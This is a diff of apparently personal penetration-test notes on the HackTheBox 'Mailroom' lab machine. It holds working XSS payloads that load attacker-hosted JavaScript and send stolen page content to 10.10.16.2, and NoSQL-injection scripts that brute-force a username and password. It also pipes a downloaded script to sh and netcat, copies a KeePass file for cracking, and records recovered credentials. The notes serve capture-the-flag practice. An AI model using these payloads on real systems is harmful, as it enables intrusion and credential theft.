@@ -3,15 +3,21 @@
 ### Mailroom ###
 ----------------------------------------
 |================================================================
-- Name: 
-- IP Address: 10.129.250.179
-- OS: 
+- Name: mailroom
+- IP Address: 10.129.203.73
+- OS: 5.4.0-146-generic / Ubuntu 20.04.6 LTS / x64
+	5.4.0-146-generic / Debian GNU/Linux 11 (bullseye) x64
 - Notes: 
 
 //CREDS:
+	//User: tristan@mailroom.htb
+    //Pass: 69trisRulez!
+
+    //User: matthew
+    //Pass: HueLover83#
 
 //Flags:
-#User:
+#User:		6e28d2a70bd32f40077136739aa6e9bd
 #System:
 
 |================================================================
@@ -21,7 +27,7 @@
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
 // SCAN
-ip=10.129.250.179
+ip=10.129.203.73
 
 2023-04-15 21:14:31 CDT -- 
 ports=$(nmap -e tun0 -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
@@ -100,24 +106,20 @@ feroxbuster -k -u http://10.129.250.179 -o feroxbuster.out
 301  http://10.129.250.179/javascript/jquery => http://10.129.250.179/javascript/jquery/
 301  http://10.129.250.179/inquiries => http://10.129.250.179/inquiries/
 
-
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-// gobuster --
+// gobuster vHOst --
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-// directory brute force
-2023-04-15 21:54:17 CDT -- 
-gobuster dir -u http://10.129.250.179 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,htm -o gobuster-80.txt
-
-
+2023-04-15 22:38:05 CDT -- 
 // vhost brute force
-gobuster vhost -u <> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+gobuster vhost -u mailroom.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -o vhost.out
 
+//Found: git.mailroom.htb Status: 200 [Size: 13201]
+// Add to /etc/hosts
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
 
 // nikto -- 
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -198,49 +200,25 @@ gobuster vhost -u mailroom.htb -w /usr/share/wordlists/seclists/Discovery/DNS/su
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-// contact.php
+########
+#BREAK
+########
+
+2023-04-28 23:09:25 CDT -- BACK!
+
+// REBIRTH
+// Made with ♥ for mailroom.htb
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-//Email Address: test@test.com
-//Inquiry Title: WAT
-//Inquiry Message: Does this work?
 
-//Request
-email=Test%40test.com&title=WAT&message=Does+this+work%3F
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-//Once submitted, the form generates a "Click Here" link
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.129.203.73\tgit.mailroom.htb mailroom.htb' >> /etc/hosts"
+cat /etc/hosts
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-
-// Testing XXS
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-//Email Address: test@test.com
-//Inquiry Title: test
-//Inquiry Message: <script>alert("TEST")</script>
-email=test%40test.com&title=test&message=<script>alert("TEST")</script>
-
-//WORKS!!
-
-//Start Listener for script reachback
-//Use http
-sudo nc -nvlp 80
-
-//Email Address: test@test.com
-//Inquiry Title: test
-//Inquiry Message: <script>alert("TEST")</script>
-
-2023-04-15 23:04:58 CDT -- 
-<script type="text/javascript" src="http://10.10.16.3/test.js"></script>
-
-connect to [10.10.16.3] from (UNKNOWN) [10.129.250.179] 56896
-GET /test.js HTTP/1.1
-Host: 10.10.16.3
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1/
-Connection: keep-alive
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
@@ -249,54 +227,879 @@ Connection: keep-alive
 http://git.mailroom.htb 
 //Gitea website
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-//Found public repo
+//Found sourcode staffroom
 http://git.mailroom.htb/matthew/staffroom
-
-//REPOS
-2023-04-15 23:16:34 CDT -- 
-git clone http://git.mailroom.htb/matthew/staffroom.git
 
 //Users
 Administrator
 Mathew
 Tristen
 
-cd staffroom
-git log -p
+//Grabbing auth.php
+wget http://git.mailroom.htb/matthew/staffroom/raw/branch/main/auth.php
 
--    // Update the user record in the database with the 2FA token
--    $collection->updateOne(
--      ['_id' => $user['_id']],
--      ['$set' => ['2fa_token' => $token]]
--    );
--
--    // Send an email to the user with the 2FA token
--    $to = $user['email'];
--    $subject = '2FA Token';
--    $message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;
--    mail($to, $subject, $message);
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-+    // Update the user record in the database with the 2FA token if not already sent in the last minute^M
-+    $user = $collection->findOne(['_id' => $user['_id']]);^M
-+    if(($user['2fa_token'] && ($now - $user['token_creation']) > 60) || !$user['2fa_token']) {^M
-+        $collection->updateOne(^M
-+          ['_id' => $user['_id']],^M
-+          ['$set' => ['2fa_token' => $token, 'token_creation' => $now]]^M
-+        );^M
-+^M
-+        // Send an email to the user with the 2FA token^M
-+        $to = $user['email'];^M
-+        $subject = '2FA Token';^M
-+        $message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;^M
-+        mail($to, $subject, $message);^M
-+    }
+
+//auth.php Notes
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+mongodb://mongodb:27017"); // Connect to the MongoDB database
+'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token='
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//Found another subdomain staff-review-panel.mailroom.htb
+// Added it to the hosts file
+
+2023-04-28 23:56:54 CDT -- 
+// 403 Forbidden when trying to visit staff-review-panel.mailroom.htb
+
+//Ran ZapProxy on mailroom.htb
+//FOUND possible injection points on http://mailroom.htb/contact.php
+
+// contact.php
+// Testing XXS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-29 00:06:02 CDT -- 
+//Email Address: test@test.com
+//Inquiry Title: test
+//Inquiry Message: <script>alert("TEST")</script>
+
+//Click Here button shows an alert popup
+//WORKS!!
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// EXPLOIT
+// Create a payload file to navigate to call the subdomain staff-review-panel.mailroom.htb
+// Result: Get the contents of index.php
+// exploit.js
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+var http = new XMLHttpRequest();
+http.open('POST', "http://staff-review-panel.mailroom.htb/index.php", true);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.onload = function () {
+        fetch("http://10.10.16.2/output?" + encodeURI(btoa(this.responseText)));
+};
+http.send(null);
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Start WebListener for site dump
+python3 -m http.server 80
+
+
+// contact.php
+// Using XXS to pull index.php
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// Browse
+http://mailroom.htb/contact.php
+
+2023-04-29 00:21:03 CDT -- 
+//Email Address: test@test.com
+//Inquiry Title: test
+//Inquiry Message: 
+	<script src="http://10.10.16.2/exploit.js"></script>
+
+//SUCCESS
+//Got Base64 code for the subdomain staff-review-panel.mailroom.htb
+
+echo '...' | base64 -d > staff-review-panel.index.php
+
+//MATChES the index.php page found in the staffroom gitea repo
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// exploit2.js
+//Changing POST page to auth.php
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+var http = new XMLHttpRequest();
+http.open('POST', "http://staff-review-panel.mailroom.htb/auth.php", true);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.onload = function () {
+        fetch("http://10.10.16.2/output?" + encodeURI(btoa(this.responseText)));
+};
+http.send(null);
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// contact.php
+// Using XXS to pull auth.php
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// Browse
+http://mailroom.htb/contact.php
+
+2023-04-29 01:02:41 CDT -- 
+//Email Address: test@test.com
+//Inquiry Title: test
+//Inquiry Message: 
+	<script src="http://10.10.16.2/exploit2.js"></script>
+
+//NOTE: Had to send back to back to get output
+
+10.129.203.73 - - [29/Apr/2023 01:19:10] "GET /exploit2.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 01:19:19] "GET /exploit2.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 01:19:19] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 01:19:19] "GET /output?eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkVtYWlsIGFuZCBwYXNzd29yZCBhcmUgcmVxdWlyZWQifQ== HTTP/1.1" 404 -
+
+echo 'eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkVtYWlsIGFuZCBwYXNzd29yZCBhcmUgcmVxdWlyZWQifQ==' | base64 -d
+
+{"success":false,"message":"Email and password are required"}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// In the file auth.php :
+$user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);
+
+//Service connects to mongodb to store data, from this code it may can be used for nosql injection.
+
+
+// exploit3.js
+// Trying nosql injection on auth.php
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+var http = new XMLHttpRequest();
+http.open('POST', "http://staff-review-panel.mailroom.htb/auth.php", true);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.onload = function () {
+        fetch("http://10.10.16.2/output?" + encodeURI(btoa(this.responseText)));
+};
+http.send("email[$ne]=test@test.com&password[$ne]=test");
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// contact.php
+// Using XXS to pull auth.php
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// Browse
+http://mailroom.htb/contact.php
+
+2023-04-29 01:28:10 CDT -- 
+//Email Address: test@test.com
+//Inquiry Title: test
+//Inquiry Message: 
+	<script src="http://10.10.16.2/exploit3.js"></script>
+
+//NOTE: Had to send back to back to get output
+
+10.129.203.73 - - [29/Apr/2023 01:28:46] "GET /exploit3.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 01:29:00] "GET /exploit3.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 01:29:01] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 01:29:01] "GET /output?eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== HTTP/1.1" 404 -
+
+echo 'eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ==' | base64 -d
+
+{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}
+
+//SUCCESS
+//nosql inject is WORKING
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// exploitUsers.js
+// Use regex nosql injection . A payload capable to brute-force all users.
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+async function callAuth(mail) {
+        var http = new XMLHttpRequest();
+        http.open('POST', "http://staff-review-panel.mailroom.htb/auth.php", true);
+        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        http.onload = function () {
+                if (/"success":true/.test(this.responseText)) {
+                        notify(mail);
+                        cal("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%'()+, -/:;<=>@[\]_`{}~", mail);
+                }
+        };
+        http.send("email[$regex]=.*" + mail + "@mailroom.htb&password[$ne]=abc");
+}
+
+function notify(mail) {
+        fetch("http://10.10.16.2/output?" + mail);
+}
+
+var chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%'()+, -/:;<=>@[\]_`{}~";
+
+function cal(chars, mail) {
+        for (var i = 0; i < chars.length; i++) {
+                callAuth(chars[i] + mail)
+        }
+}
+
+cal(chars, "");
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2023-04-29 01:46:07 CDT -- 
+//Using BURP repeater to send requests to auth.php
+//Request:
+	email=test%40mailroom.com&title=Test&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.16.2%2FexploitUsers.js%22%3E%3C%2Fscript%3E
+
+// Trial1
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+10.129.203.73 - - [29/Apr/2023 01:47:38] "GET /exploitUsers.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 01:47:45] "GET /exploitUsers.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 01:47:46] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 01:47:46] "GET /output?n HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 01:47:47] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 01:47:47] "GET /output?an HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 01:47:48] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 01:47:48] "GET /output?tan HTTP/1.1" 404 -
+
+//The process that was scanning stopped at tan, possibly because the process was running out of time.
+//Set cal(chars, "");  to cal(chars,"tan"); try BURP send again
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// Trial2
+2023-04-29 01:54:12 CDT -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+10.129.203.73 - - [29/Apr/2023 01:53:17] "GET /exploitUsers.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 01:53:24] "GET /exploitUsers.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 01:53:25] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 01:53:25] "GET /output?stan HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 01:53:26] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 01:53:26] "GET /output?istan HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 01:53:27] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 01:53:27] "GET /output?ristan HTTP/1.1" 404 -
+
+//Same as above
+//Set cal(chars, "tan");  to cal(chars,"ristan"); try BURP send again 
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// Trial3
+2023-04-29 02:01:19 CDT -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+10.129.203.73 - - [29/Apr/2023 01:55:56] "GET /exploitUsers.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 01:56:01] "GET /exploitUsers.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 01:56:02] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 01:56:02] "GET /output?tristan HTTP/1.1" 404 -
+
+//Username: tristan
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//With the username(tristan), lets use the same steps with the password.
+
+
+// exploitPass.js
+// Use regex nosql injection . A payload capable to brute-force password.
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+async function callAuth(pass) {
+        var http = new XMLHttpRequest();
+        http.open('POST', "http://staff-review-panel.mailroom.htb/auth.php", true);
+        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        http.onload = function () {
+                if (/"success":true/.test(this.responseText)) {
+                        notify(pass);
+                        cal("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%'()+, -/:;<=>@[\]_`{}~", mail);
+                }
+        };
+        http.send("email=tristan@mailroom.htb&password[$regex]=^"+pass);
+}
+
+function notify(pass) {
+        fetch("http://10.10.16.2/output?" + pass);
+}
+
+var chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%'()+, -/:;<=>@[\]_`{}~";
+
+function cal(chars, pass) {
+        for (var i = 0; i < chars.length; i++) {
+                callAuth(pass + chars[i])
+        }
+}
+
+cal(chars, "");
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Using BURP repeater to send requests to auth.php
+//Request:
+	email=test%40mailroom.com&title=Test&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.16.2%2FexploitPass.js%22%3E%3C%2Fscript%3E
+
+2023-04-29 02:10:12 CDT -- 
+// Trial1
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+10.129.203.73 - - [29/Apr/2023 02:08:48] "GET /exploitPass.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 02:08:53] "GET /exploitPass.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 02:08:54] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 02:08:54] "GET /output?6 HTTP/1.1" 404 -
+
+//The process that was scanning stopped at 6
+//Set cal(chars, "");  to cal(chars,"6"); try BURP send again
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// Trial2
+2023-04-29 02:14:54 CDT -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+10.129.203.73 - - [29/Apr/2023 02:14:09] "GET /exploitPass.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 02:14:14] "GET /exploitPass.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 02:14:15] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 02:14:15] "GET /output?69 HTTP/1.1" 404 -
+
+//Set cal(chars, "6");  to cal(chars,"69"); try BURP send again
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// Trial3
+2023-04-29 02:17:21 CDT -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+10.129.203.73 - - [29/Apr/2023 02:17:38] "GET /exploitPass.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 02:17:43] "GET /exploitPass.js HTTP/1.1" 200 -
+10.129.203.73 - - [29/Apr/2023 02:17:43] code 404, message File not found
+10.129.203.73 - - [29/Apr/2023 02:17:43] "GET /output?69t HTTP/1.1" 404 -
+
+//Set cal(chars, "69");  to cal(chars,"69t"); try BURP send again
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// Trial+
+// Changing cal(chars, "*"); 
+2023-04-29 02:20:44 CDT -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+10.129.203.73 - - [29/Apr/2023 02:19:12] "GET /output?69tr HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:20:34] "GET /output?69tri HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:21:12] "GET /output?69tris HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:21:45] "GET /output?69trisR HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:22:48] "GET /output?69trisRu HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:23:25] "GET /output?69trisRul HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:24:02] "GET /output?69trisRule HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:24:35] "GET /output?69trisRulez HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:25:25] "GET /output?69trisRulez! HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:26:00] "GET /output?69trisRulez!$ HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:26:52] "GET /output?69trisRulez!$$ HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:27:27] "GET /output?69trisRulez!$$$ HTTP/1.1" 404 -
+10.129.203.73 - - [29/Apr/2023 02:28:13] "GET /output?69trisRulez!$$$$ HTTP/1.1" 404 -
+
+//Just keeps adding '$' after the last couple of tries
+//Creds: 
+	//User: tristan@mailroom.htb
+	//Pass: 69trisRulez!
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//With possible creds lets try and SSH into box
+
+// SSH Connect
+	//User: tristan@mailroom.htb
+    //Pass: 69trisRulez!
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-29 02:37:01 CDT -- 
+// connect SSH
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" tristan@mailroom.htb
+
+//SUCCESS
+
+// ENUM (tristan)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+id
+uid=1000(tristan) gid=1000(tristan) groups=1000(tristan)
+
+uname -a
+Linux mailroom 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+
+cat /etc/*elease | egrep -i pretty
+PRETTY_NAME="Ubuntu 20.04.6 LTS"
+
+ls -lah /home/tristan
+//No user.txt for tristan
+
+sudo -ll
+Sorry, user tristan may not run sudo on mailroom.
+
+ps -ef fw
+UID          PID    PPID  C STIME TTY      STAT   TIME CMD
+tristan    79476   79474  0 07:38 pts/0    Ss     0:00 -bash
+tristan    80077   79476  0 07:42 pts/0    R+     0:00  \_ ps -ef fw
+tristan     1992    1989  0 03:54 ?        Ssl    0:19 /usr/local/bin/gitea web
+tristan    79350       1  0 07:38 ?        Ss     0:00 /lib/systemd/systemd --user
+
+netstat -antp
+tcp        0      0 127.0.0.1:42355         0.0.0.0:*               LISTEN      - 
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 172.19.0.1:25           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+
+
+ip a
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b9:e1:77 brd ff:ff:ff:ff:ff:ff
+    inet 10.129.203.73/16 brd 10.129.255.255 scope global dynamic eth0
+3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 02:42:05:7d:20:c4 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+4: br-8d7f99d1fac5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:1a:27:f6:ea brd ff:ff:ff:ff:ff:ff
+    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-8d7f99d1fac5
+
+2023-04-29 02:47:29 CDT -- 
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+tristan:x:1000:1000:tristan:/home/tristan:/bin/bash
+matthew:x:1001:1001:,,,:/home/matthew:/bin/bash
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-29 02:50:38 CDT -- 
+// install peass
+sudo apt install -y peass
+
+// get a copy of linpeas shell script or binary
+cp /usr/share/peass/linpeas/linpeas.sh .
+
+mktemp -d
+/tmp/tmp.lZMfmhb62H
+
+cd /tmp/tmp.lZMfmhb62H
+
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 80
+  // kali term2
+nc -lvnp 443 | tee linpeas.out
+2023-04-29 02:55:23 CDT -- 
+  // target
+curl 10.10.16.2:80/linpeas.sh | sh | nc 10.10.16.2 443
+
+less -r linpeas.out
+
+//Interesting
+╔══════════╣ Hostname, hosts and DNS
+mailroom                                                                                                     
+127.0.0.1 localhost mailroom.htb git.mailroom.htb staff-review-panel.mailroom.htb
+127.0.1.1 mailroom
+
+╔══════════╣ Analyzing Postfix Files (limit 70)
+flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
+#  user=cyrus argv=/cyrus/bin/deliver -e -r ${sender} -m ${extension} ${user}
+#  flags=R user=cyrus argv=/cyrus/bin/deliver -e -m ${extension} ${user}
+  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
+  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
+  flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
+  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
+  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py
+
+
+╔══════════╣ Analyzing Keepass Files (limit 70)
+-rw-r--r-- 1 matthew matthew 1998 Mar 16 22:47 /home/matthew/personal.kdbx
+
+
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/                                                                                                 /home/matthew/user.txt
+/home/matthew/.kpcli-history
+/root/
+
+╔══════════╣ Mails (limit 50)
+    30943      4 -rw-------   1 root     mail          615 Apr 29 07:54 /var/mail/root                     29709      4 -rw-------   1 tristan  mail          417 Apr 29 07:54 /var/mail/tristan
+    30943      4 -rw-------   1 root     mail          615 Apr 29 07:54 /var/spool/mail/root
+    29709      4 -rw-------   1 tristan  mail          417 Apr 29 07:54 /var/spool/mail/tristan
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+2023-04-29 05:45:25 CDT -- 
+//Copying kkdbx file to kali
+scp -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" tristan@mailroom.htb:/home/matthew/personal.kdbx .
+
+keepass2john personal.kdbx > Keepass.hash
+
+2023-04-29 05:58:52 CDT -- 
+john --wordlist=/usr/share/wordlists/rockyou.txt Keepass.hash
+//Nothing
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+// SSH Connect(SOCK5)
+    //User: tristan@mailroom.htb
+    //Pass: 69trisRulez!
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Logging back in with SOCKS5 proxy
+sudo sed -i 's/socks4/socks5/' /etc/proxychains4.conf
+
+2023-04-29 03:21:45 CDT -- 
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" tristan@mailroom.htb -D 9050
 
 
+// nmap SOCKS5 proxy
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=127.0.0.1
+ports=42355,53,22,25,80
+
+echo $ports
+//42355,53,22,25,80
+
+sudo proxychains -q nmap -e tun0 -Pn -sT -A -p$ports $ip -oN tcpSOCKS.nmap
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//BURP
+//Add SOCKS5 proxy 127.0.0.1:9050 in connections
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-29 03:47:03 CDT -- 
+//Browse
+http://staff-review-panel.mailroom.htb/
+//Go to the website, and use the email and password found.
+	//User: tristan@mailroom.htb
+    //Pass: 69trisRulez!
+
+//MESSAGE: Check your inbox for an email with your 2FA token
+
+cat /var/mail/tristan
+Return-Path: <noreply@mailroom.htb>
+X-Original-To: tristan@mailroom.htb
+Delivered-To: tristan@mailroom.htb
+Received: from localhost (unknown [172.19.0.5])
+        by mailroom.localdomain (Postfix) with SMTP id 5586A1CCC
